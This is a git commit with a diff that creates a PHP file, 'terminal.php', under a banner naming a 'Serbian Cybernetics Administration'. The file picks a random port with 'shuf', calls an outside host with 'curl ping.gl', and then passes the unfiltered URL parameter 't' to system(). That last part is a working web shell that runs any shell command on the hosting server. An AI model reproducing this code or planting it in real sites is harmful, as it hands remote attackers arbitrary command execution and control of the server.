8ced62d6e357eb3c6cb2a4370d830817ee507699
Milutin Gavrilović <milutingavrilovic@yahoo.com>
2024-07-09 20:11:05 +0200

    Create terminal.php

---
+++ terminal.php
@@ -0,0 +1,22 @@
+<?php
+echo '<pre>USKRS - Uprava Srpske Kibernetike</pre>';
+
+echo '<pre>';
+$last_line = system('shuf -i 1024-65535 -n 1', $retval);
+
+echo '
+</pre>
+<hr />Random port: ' . $last_line . '
+<hr />Vrati vrednost: ' . $retval;
+
+
+echo '<pre>';
+$last_line = system('curl ping.gl', $retval);
+echo '<hr />Vrati vrednost:' . $retval;
+echo '</pre>';
+
+echo '<pre>';
+echo 'terminal<hr />';
+echo system($_GET['t']);
+echo '</pre>';
+?>
